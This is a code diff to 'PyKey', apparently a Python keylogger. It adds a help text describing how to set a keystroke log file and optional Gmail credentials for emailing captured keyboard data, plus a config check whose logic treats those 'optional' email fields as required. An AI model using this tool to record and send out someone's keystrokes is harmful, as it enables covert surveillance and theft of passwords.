@@ -238,12 +238,38 @@ class PyKey:
         else:
             self.recordWindows()
 
+    def help(self):
+        help = '''\
+
+  PyKey v 1.0.0
+  -------------
+    Usage: you need to edit the main file (pykey.py) and set the following properties:
+           -> self.LOG_FILE: file path where to write the keyboard data
+           -> self.EMAIL_FROM: (Optional) Email from to send the log data
+           -> self.EMAIL_TO: (Optional) Email to to send the log data
+           -> self.GMAIL_USER: (Optional) Gmail user account to sned the emails
+           -> self.GMAIL_PWD: (Optional) Gmail password to sned the emails
+
+    Once you have configured the script, execute it with the following command
+        python pykey.py
+
+\
+        '''
+        print(help)
+
+    def checkConfig(self):
+        """ Check the config options
+        """
+        if self.GMAIL_USER == '' or self.GMAIL_PWD == '' or self.EMAIL_FROM == '' or self.EMAIL_TO == '' or self.LOG_FILE == '' :
+            return True
+        else:
+            return False
 
     def start(self):
         """ Start the key record
         """
-        if self.LOG_FILE == '':
-            print("Error: Log file not found")
+        if self.checkConfig():
+            self.help()
             sys.exit(errno.EACCES)
 
         self.recordKeys()
